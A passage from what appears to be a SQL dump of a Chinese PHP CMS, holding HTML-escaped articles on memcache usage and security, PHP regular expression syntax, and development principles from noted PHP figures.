进行。首先对 key 进行 hash，通过获得的值可以确定它被保存在了哪台 Server 上，然后再向该 Server 发出请求。Client 端只需要知道保存 hash(key) 的值在哪台服务器上就可以了。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n其实说到底，memcache 的工作就是在专门的机器的内存里维护一张巨大的 hash 表，来存储经常被读写的一些数组与文件，从而极大的提高网站的运行效率（当然花钱就是必不可免的事了，听说 MySpace 的每台 Cache 服务器都配备了至少 64G 的内存）。但是也要注意 memcache 不是万能的，毕竟网络方面的不稳定因素还是比较多的，如果不是很大的应用，我建议大家使用一些本地的轻量级的 Cache 库，比如 PHP 的 Cache_Lite 或者 Java 的 FileCache 等，最后希望大家读完这篇能有所收获 ：）&amp;nbsp;&lt;br /&gt;\r\n（2）高级&amp;nbsp;&lt;br /&gt;\r\n很多人把它当作和SharedMemory那种形式的存储载体来使用，虽然memcached使用了同样的“Key=&amp;gt;Value”方式组织数据，但是它和共享内存、APC等本地缓存有非常大的区别。Memcached是分布式的，也就是说它不是本地的。它基于网络连接（当然它也可以使用 localhost）方式完成服务，本身它是一个独立于应用的程序或守护进程（Daemon方式）。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nMemcached使用libevent库实现网络连接服务，理论上可以处理无限多的连接，但是它和Apache不同，它更多的时候是面向稳定的持续连接的，所以它实际的并发能力是有限制的。在保守情况下memcached的最大同时连接数为200，这和Linux线程能力有关系，这个数值是可以调整的。关于libevent可以参考相关文档。 Memcached内存使用方式也和APC不同。APC是基于共享内存和MMAP的，memcachd有自己的内存分配算法和管理方式，它和共享内存没有关系，也没有共享内存的限制，通常情况下，每个memcached进程可以管理2GB的内存空间，如果需要更多的空间，可以增加进程数。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n三、为什么要在Web中使用（memcache解决什么问题）&amp;nbsp;&lt;br /&gt;\r\n（1）减少数据库压力&amp;nbsp;&lt;br /&gt;\r\n这个算是比较重要的，所有的数据基本上都是保存在数据库当中的，每次频繁的存取数据库，导致 数据库性能极具下降，无法同时服务更多的用户，比如MySQL，特别频繁的锁表，那么让Memcache来分担数据库的压力吧。我们需要一种改动比较小， 并且能够不会大规模改变前端的方式来进行改变目前的架构。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;img src=&quot;http://dl.javaeye.com/upload/attachment/424412/8b4d6f61-d2bc-3827-8222-1b30b05771f4.png&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n我考虑的一种简单方法：&amp;nbsp;&lt;br /&gt;\r\n后端的数据库操作模块，把所有的Select操作提取出来 （update/delete/insert不管），然后把对应的SQL进行相应的hash算法计算得出一个hash数据key（比如MD5或者 SHA），然后把这个key去Memcache中查找数据，如果这个数据不存在，说明还没写入到缓存中，那么从数据库把数据提取出来，一个是数组类格式， 然后把数据在set到Memcache中，key就是这个SQL的hash值，然后相应的设置一个失效时间，比如一个小时，那么一个小时中的数据都是从缓 存中提取的，有效减少数据库的压力。缺点是数据不实时，当数据做了修改以后，无法实时到前端显示，并且还有可能对内存占用比较大，毕竟每次select出 来的数据数量可能比较巨大，这个是需要考虑的因素。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n（2）什么场合使用？&amp;nbsp;&lt;br /&gt;\r\n在很多时候，memcached都被滥用了，这当然少不了对它的抱怨。我经常在论坛上看见有人发贴，类似于“如何提高效率”，回复是“用memcached”，至于怎么用，用在哪里，用来干什么一句没有。memcached不是万能的，它也不是适用在所有场合。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nMemcached是“分布式”的内存对象缓存系统，那么就是说，那些不需要“分布”的，不需要共享的，或者干脆规模小到只有一台服务器的应用，memcached不会带来任何好处，相反还会拖慢系统效率，因为网络连接同样需要资源，即使是UNIX本地连接也一样。 在我之前的测试数据中显示，memcached本地读写速度要比直接PHP内存数组慢几十倍，而APC、共享内存方式都和直接数组差不多。可见，如果只是本地级缓存，使用memcached是非常不划算的。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\nMemcached在很多时候都是作为数据库前端cache使用的。因为它比数据库少了很多SQL解析、磁盘操作等开销，而且它是使用内存来管理数据的，所以它可以提供比直接读取数据库更好的性能，在大型系统中，访问同样的数据是很频繁的，memcached可以大大降低数据库压力，使系统执行效率提升。另外，memcached也经常作为服务器之间数据共享的存储媒介，例如在SSO系统中保存系统单点登陆状态的数据就可以保存在memcached 中，被多个应用共享。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n需要注意的是，memcached使用内存管理数据，所以它是易失的，当服务器重启，或者memcached进程中止，数据便会丢失，所以 memcached不能用来持久保存数据。很多人的错误理解，memcached的性能非常好，好到了内存和硬盘的对比程度，其实memcached使用内存并不会得到成百上千的读写速度提高，它的实际瓶颈在于网络连接，它和使用磁盘的数据库系统相比，好处在于它本身非常“轻”，因为没有过多的开销和直接的读写方式，它可以轻松应付非常大的数据交换量，所以经常会出现两条千兆网络带宽都满负荷了，memcached进程本身并不占用多少CPU资源的情况。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n四、安装memcache（在服务器端）&amp;nbsp;&lt;br /&gt;\r\n（1）windows下&amp;nbsp;&lt;br /&gt;\r\n（2）在linux下&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n五、memcached服务器的管理&amp;nbsp;&lt;br /&gt;\r\n（1）Windows下：&amp;nbsp;&lt;br /&gt;\r\n启动&amp;nbsp;&lt;br /&gt;\r\n查看端口，是否启动成功&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n（2）Linux下：&amp;nbsp;&lt;br /&gt;\r\n运行 memcached 守护程序很简单，只需一个命令行即可，不需要修改任何配置文件（也没有配置文件给你修改 ）：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n/usr/bin/memcached -d -m 128 -l 192.168.10.1 -p 10101 -u httpd&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n参数解释：&amp;nbsp;&lt;br /&gt;\r\n-d 以守护程序（daemon）方式运行 memcached；&amp;nbsp;&lt;br /&gt;\r\n-m 设置 memcached 可以使用的内存大小，单位为 M；&amp;nbsp;&lt;br /&gt;\r\n-l 设置监听的 IP 地址，如果是本机的话，通常可以不设置此参数；&amp;nbsp;&lt;br /&gt;\r\n-p 设置监听的端口，默认为 11211，所以也可以不设置此参数；&amp;nbsp;&lt;br /&gt;\r\n-u 指定用户，如果当前为 root 的话，需要使用此参数指定用户。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n当然，还有其它参数可以用，man memcached 一下就可以看到了。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n六、使用memcache（在客户端）&amp;nbsp;&lt;br /&gt;\r\n不同语言：可以是php/JAVA等&amp;nbsp;&lt;br /&gt;\r\n首先，建立连接。通过IP和端口。访问apache、mysql也是通过IP和端口。&amp;nbsp;&lt;br /&gt;\r\n其实，连接成功后，使用：&amp;nbsp;&lt;br /&gt;\r\nAdd&amp;nbsp;&lt;br /&gt;\r\nSet/replace&amp;nbsp;&lt;br /&gt;\r\nGet&amp;nbsp;&lt;br /&gt;\r\nQuit&amp;nbsp;&lt;br /&gt;\r\n遍历：本身没提供。&amp;nbsp;&lt;br /&gt;\r\nState子命令： stat items&amp;nbsp;&lt;br /&gt;\r\nStats cachedump 1 0&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n附：PHP的Memcache&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt; ?php&amp;nbsp;&lt;br /&gt;\r\n//连接&amp;nbsp;&lt;br /&gt;\r\n$mem = new Memcache;&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;connect(&quot;192.168.0.200&quot;, 12000);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//保存数据&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;set(''key1'', ''This is first value'', 0, 60);&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val .&quot;&amp;lt;br /&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//替换数据&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;replace(''key1'', ''This is replace value'', 0, 60);&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br /&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//保存数组&amp;nbsp;&lt;br /&gt;\r\n$arr = array(''aaa'', ''bbb'', ''ccc'', ''ddd'');&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;set(''key2'', $arr, 0, 60);&amp;nbsp;&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(''key2'');&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&amp;nbsp;&lt;br /&gt;\r\nprint_r($val2);&amp;nbsp;&lt;br /&gt;\r\necho &quot;&amp;lt;br /&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//删除数据&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;delete(''key1'');&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1'');&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br /&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//清除所有数据&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;flush();&amp;nbsp;&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(''key2'');&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&amp;nbsp;&lt;br /&gt;\r\nprint_r($val2);&amp;nbsp;&lt;br /&gt;\r\necho &quot;&amp;lt;br /&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n//关闭连接&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;close();&amp;nbsp;&lt;br /&gt;\r\n?&amp;gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n如果正常的话，浏览器将输出：&amp;nbsp;&lt;br /&gt;\r\nGet key1 value: This is first value&amp;nbsp;&lt;br /&gt;\r\nGet key1 value: This is replace value&amp;nbsp;&lt;br /&gt;\r\nGet key2 value: Array ( [0] =&amp;gt; aaa [1] =&amp;gt; bbb [2] =&amp;gt; ccc [3] =&amp;gt; ddd )&amp;nbsp;&lt;br /&gt;\r\nGet key1 value:&amp;nbsp;&lt;br /&gt;\r\nGet key2 value:&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n程序代码分析&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n初始化一个Memcache的对象：&amp;nbsp;&lt;br /&gt;\r\n$mem = new Memcache;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n连接到我们的Memcache服务器端，第一个参数是服务器的IP地址，也可以是主机名，第二个参数是Memcache的开放的端口：&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;connect(&quot;192.168.0.200&quot;, 12000);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n保存一个数据到Memcache服务器上，第一个参数是数据的key，用来定位一个数据，第二个参数是需要保存的数据内容，这里是一个字符串，第三个参数是一个标记，一般设置为0或者MEMCACHE_COMPRESSED就行了，第四个参数是数据的有效期，就是说数据在这个时间内是有效的，如果过去这个时间，那么会被Memcache服务器端清除掉这个数据，单位是秒，如果设置为0，则是永远有效，我们这里设置了60，就是一分钟有效时间：&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;set(‘key1‘, ‘This is first value'', 0, 60);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n从Memcache服务器端获取一条数据，它只有一个参数，就是需要获取数据的key，我们这里是上一步设置的key1，现在获取这个数据后输出输出：&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(''key1′);&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n现在是使用replace方法来替换掉上面key1的值，replace方法的参数跟set是一样的，不过第一个参数key1是必须是要替换数据内容的key，最后输出了：&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$mem-&amp;gt;replace(‘key1′, ‘This is replace value'', 0, 60);&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(‘key1′);&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n同样的，Memcache也是可以保存数组的，下面是在Memcache上面保存了一个数组，然后获取回来并输出&amp;nbsp;&lt;br /&gt;\r\n$arr = array(‘aaa'', ‘bbb'', ‘ccc'', ‘ddd'');&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;set(‘key2′, $arr, 0, 60);&amp;nbsp;&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(‘key2′);&amp;nbsp;&lt;br /&gt;\r\nprint_r($val2);&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n现在删除一个数据，使用delte接口，参数就是一个key，然后就能够把Memcache服务器这个key的数据删除，最后输出的时候没有结果&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;delete(‘key1′);&amp;nbsp;&lt;br /&gt;\r\n$val = $mem-&amp;gt;get(‘key1′);&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key1 value: &quot; . $val . &quot;&amp;lt;br&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n最后我们把所有的保存在Memcache服务器上的数据都清除，会发现数据都没有了，最后输出key2的数据为空，最后关闭连接&amp;nbsp;&lt;br /&gt;\r\n$mem-&amp;gt;flush();&amp;nbsp;&lt;br /&gt;\r\n$val2 = $mem-&amp;gt;get(‘key2′);&amp;nbsp;&lt;br /&gt;\r\necho &quot;Get key2 value: &quot;;&amp;nbsp;&lt;br /&gt;\r\nprint_r($val2);&amp;nbsp;&lt;br /&gt;\r\necho &quot;&amp;lt;br&amp;gt;&quot;;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n七、Memcache的安全&amp;nbsp;&lt;br /&gt;\r\n我们上面的 Memcache服务器端都是直接通过客户端连接后直接操作，没有任何的验证过程，这样如果服务器是直接暴露在互联网上的话是比较危险，轻则数据泄露被其 他无关人员查看，重则服务器被入侵，因为Mecache是以root权限运行的，况且里面可能存在一些我们未知的bug或者是缓冲区溢出的情况，这些都是 我们未知的，所以危险性是可以预见的。为了安全起见，我做两点建议，能够稍微的防止黑客的入侵或者数据的泄露。&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n内网访问&amp;nbsp;&lt;br /&gt;\r\n最好把两台服务器之间的访问是内网形态的，一般是Web服务器跟Memcache服务器之间。普遍 的服务器都是有两块网卡，一块指向互联网，一块指向内网，那么就让Web服务器通过内网的网卡来访问Memcache服务器，我们Memcache的服务 器上启动的时候就监听内网的IP地址和端口，内网间的访问能够有效阻止其他非法的访问。&amp;nbsp;&lt;br /&gt;\r\n# memcached -d -m 1024 -u root -l 192.168.0.200 -p 11211 -c 1024 -P /tmp/memcached.pid&amp;nbsp;&lt;br /&gt;\r\nMemcache服务器端设置监听通过内网的192.168.0.200的ip的11211端口，占用1024MB内存，并且允许最大1024个并发连接&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n设置防火墙&amp;nbsp;&lt;br /&gt;\r\n防火墙是简单有效的方式，如果却是两台服务器都是挂在网的，并且需要通过外网IP来访问Memcache的话，那么可以考虑使用防火墙或者代理程序来过滤非法访问。&amp;nbsp;&lt;br /&gt;\r\n一般我们在Linux下可以使用iptables或者FreeBSD下的ipfw来指定一些规则防止一些非法的访问，比如我们可以设置只允许我们的Web服务器来访问我们Memcache服务器，同时阻止其他的访问。&amp;nbsp;&lt;br /&gt;\r\n# iptables -F&amp;nbsp;&lt;br /&gt;\r\n# iptables -P INPUT DROP&amp;nbsp;&lt;br /&gt;\r\n# iptables -A INPUT -p tcp -s 192.168.0.2 –dport 11211 -j ACCEPT&amp;nbsp;&lt;br /&gt;\r\n# iptables -A INPUT -p udp -s 192.168.0.2 –dport 11211 -j ACCEPT&amp;nbsp;&lt;br /&gt;\r\n上面的iptables规则就是只允许192.168.0.2这台Web服务器对Memcache服务器的访问，能够有效的阻止一些非法访问，相应的也可以增加一些其他的规则来加强安全性，这个可以根据自己的需要来做。&amp;nbsp;&lt;/span&gt;', 1, 1, 0, 0, 1302428863, 1, 'admin'),
(44, 1, 'php正则表达式简介-php正则介绍', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;[abc] 匹配中任意一个原子&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n[^abc] 匹配除了原子表内的任意字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n元字符：metacharacter&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n. 除了换行符外的任意字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n^ 匹配以其后字符串开头的任意字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n+ 匹配1个或多个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n？ 匹配0个或1个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n* 匹配0、1个或多个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$ 匹配任何以其前的字符串结尾的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{m} 匹配m个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{m,n} 匹配至少m个最多n个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n{m.} 匹配至少m个其前的字符串&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n| 匹配任意长度的字符串或&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\ 常规的转义字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\d 匹配一个数字[0-9]&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\D 匹配除数字以外的任何一个字符[^0-9]&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\w 匹配一个英文字母、数字或下划线[0-9a-zA-Z_] 匹配字母或数字或下划线或汉字等&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\W 匹配一个非英文字母、数字和下划线的任何一个字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\s 匹配任意的一个空白符，包括空格，制表符(Tab)，换行符，中文全角空格等&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\S 匹配非空白字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\b 匹配单词边界&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\B 匹配除单词边界外的任意字符&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\A 只匹配字符串开头&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n模式修正符：&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\ni 不区分大小写进行匹配&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nm 将字符串视为多行。默认情况下^和$匹配字符串的最开始和最结尾。使用m修饰符将使^和$匹配字符串中每行的开始。&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\ns 将一个字符串视为一行，忽略其中的换行符：与m相反&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nx 忽略正则表达式中的空白和注释&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\nU 第一次匹配后停止，既查找到第一个字符串后，停止后面的搜索&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n行定位符：用来描述字符的边界&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n^ 每行的开始&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n$ 每行的结尾&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n单词的定位符：&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\b&amp;nbsp;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n\\B&lt;/span&gt;', 1, 1, 0, 0, 1302530975, 1, 'admin'),
(45, 1, '顶级PHP大师的开发原则之技术描述', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;border-collapse:collapse;color:#333333;font-family:arial;font-size:14px;line-height:21px;&quot;&gt;&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;1. 在合适的时候使用&lt;span id=&quot;rlt_1&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;PHP&lt;/span&gt;&amp;nbsp;– Rasmus Lerdorf&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　没有谁比PHP的创建者Rasmus Lerdorf明白PHP用在什么地方是更合理的，他于1995年发布了PHP这门语言，从那时起，PHP就像燎原之火，烧遍了整个&lt;span id=&quot;rlt_2&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;开发&lt;/span&gt;阵营，改变了互联网的世界。可是，Rasmus并不是因此而创建PHP的。PHP是为了解决web开发者的实际&lt;span id=&quot;rlt_9&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;问题&lt;/span&gt;而诞生的。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　和许多开源项目一样，PHP变得流行，流行的动机并不能用正常的哲学来进行解释，甚至流行得有些孤芳自赏。它完全可以作为一个案例，一个解决各种Web问题的工具需求所引起的案例，因此当PHP刚出现的时候，这种工具需求全部聚焦到PHP的身上。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　但是，你不能奢望PHP可以解决所有问题。Lerdorf是第一个承认PHP只是一种工具的人，并且PHP也有很多力所不能及的情况。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　根据工作的不同来选择合适的工具。我跑了很多家公司，为了说服他们部署和使用PHP，但是这并不意味着PHP对所有问题都适用。它只是可以一个解决大部分问题的front-end脚步语言。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　作为一个web开发者，尝试用PHP解决所有问题是不科学的，同时也会浪费你的时间。当PHP玩不转的时候，不要犹豫，试用一下其他的语言吧。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;2. 使用多表存储提高规模伸缩性 – Matt Mullenweg&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　没有人愿意质疑Matt Mullenweg在PHP方面的权威性，他开发了这个星球上最流行的blog系统,(依靠一个强大的社区力量支持)： WordPress. 创建Wordpress以后，Matt和他的团队启动了WordPress.com平台，一个基于WordPress MU的免费blog站点。现在，Wordpress.com已经拥有大约400万&lt;span id=&quot;rlt_3&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;用户&lt;/span&gt;， 这些用户每天提供超过 140,000篇的日志。 (要查看更多Wordpress.com的统计情况，请点击这里.)&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　如果有人知道如何让网站的规模伸缩自如，这个人一定是Matt Mullenweg。2006年的时候 Matt对Wordpress的数据结构进行了前瞻性的改进，并且解释了为什么Wordpress MU对每个blog使用独立的MYSQL表格， 而不是把所有的blog数据都塞进一个巨大的表格。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　我们测试过这个方法，但是发现如果要扩展它的伸缩性，代价太高。如果用一个整体的数据结构，在大流量面前，你将会面临&lt;span id=&quot;rlt_8&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;服务器&lt;/span&gt;&amp;nbsp;硬件的问题。在MU里面。用户们都被分布到独立的表格当中，并且可以轻易地组织起来。举个例子，WordPress.com把用户的数据分散存储到4096个&lt;span id=&quot;rlt_10&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;数据库&lt;/span&gt;中，这些数据库可以分散大规模的数据访问，实现流量和压力分流。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　数据表的可迁移性让&lt;span id=&quot;rlt_4&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;代码&lt;/span&gt;(blog)可以运行得更快，并且让系统具备更强的伸缩性。依靠强大的缓存策略和灵活的数据库运用策略， Matt向人们展示了时下最流行的Facebook和Wordpress.com都可以在PHP下稳定运行，并且处理惊人的访问量。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　&lt;b style=&quot;outline-style:none;outline-width:initial;outline-color:initial;font-weight:700;&quot;&gt;3. 千万不要相信用户 – Dave Child&lt;/b&gt;&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Dave Child是Added Bytes (previously ilovejackdaniels.com) 网站的核心人物，这个网站以他出色的《cheat sheets for many programming languages》而闻名。 Dave为很多英国的公司服务，并且已经在编程世界里树立起相当的权威。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Dave为PHP开发者提供了很多深谋远虑的建议，并总结成了《writing secure code in PHP》：千万不要相信你的用户，他们甚至可能会伤害你。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　有一条web开发的基本原则，我重复多少遍都觉得不够，那就是：千万不要相信你的用户，同时要假设你网站中的每个数据单元都是从用户那里收集来的恶意代码。很多时候，你必须用javascript在客户端检验表单提交过来的内容， 如果你习惯了如此，那么，这是一个好习惯。如果安全性对你来说很重要，这就是最重要最需要&lt;span id=&quot;rlt_5&quot; style=&quot;outline-style:none;outline-width:initial;outline-color:initial;cursor:pointer;border-bottom-width:1px;border-bottom-style:solid;border-bottom-color:#fa891b;&quot;&gt;学习&lt;/span&gt;的原则。&lt;br style=&quot;outline-style:none;outline-width:initial;outline-color:initial;&quot; /&gt;\r\n　　Dave目前正致力于为它的《Writing Secure PHP》系列书籍整理实例，书的最后他说:&lt;br 